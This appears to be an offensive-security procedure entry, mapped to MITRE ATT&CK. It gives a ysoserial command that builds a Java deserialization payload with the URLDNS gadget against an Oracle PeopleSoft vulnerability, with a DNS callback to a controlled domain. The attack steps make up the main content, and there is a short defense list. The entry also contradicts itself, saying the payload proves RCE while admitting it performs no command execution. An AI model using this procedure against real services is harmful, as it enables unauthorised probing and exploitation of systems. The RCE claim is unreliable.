---
id: proc-uuid-002
tags:
  - payload
  - rce
  - urldns
type: procedure
tools:
  - '[[tools/ysoserial]]'
  - '[[tools/java]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/java-generate-urldns-payload]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:20.532Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Generate-RCE-Payload-with-URLDNS

## Summary

This procedure uses ysoserial to generate a serialized Java payload employing the URLDNS gadget, which triggers a DNS resolution to a controlled domain upon deserialization, proving RCE in vulnerable Java services like PeopleSoft's monitor endpoint.

## Description

The URLDNS gadget chain leverages Java's URL class to force a DNS lookup during deserialization, confirming execution without full command execution. Targeted at CVE-2017-10366 in Oracle PeopleSoft, where untrusted data is deserialized via readObject() without validation. Requires built ysoserial JAR and a controlled DNS domain.

## Requirements

1. Built ysoserial JAR in current directory
2. Java runtime environment
3. Controlled DNS domain (e.g., dod_test.jexboss.info)

## Defense

Defensive measures and detection strategies:

- Implement deserialization filters (e.g., NotSoSerial) or allowlists
- Monitor for anomalous DNS queries from application servers
- Log and alert on unexpected Java deserialization attempts

## Objectives

1. Create proof-of-concept RCE payload
2. Enable verification via DNS exfiltration
3. Prepare for transmission to vulnerable endpoint

## Instructions

### Step 1: Execute Ysoserial for URLDNS Gadget

**Context**: Generate the binary payload that will trigger DNS lookup on deserialization.

**Command** ([[commands/java-generate-urldns-payload]]):
```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod_test.jexboss.info > payload
```

> Runs ysoserial with URLDNS gadget targeting the specified URL, redirecting binary output to 'payload'. Expected output: Binary file created; no console errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/java-generate-urldns-payload]]

## Tools Used

- [[tools/ysoserial]]
- [[tools/java]]

## Tags

- [[payload]]
- [[rce]]
- [[urldns]]
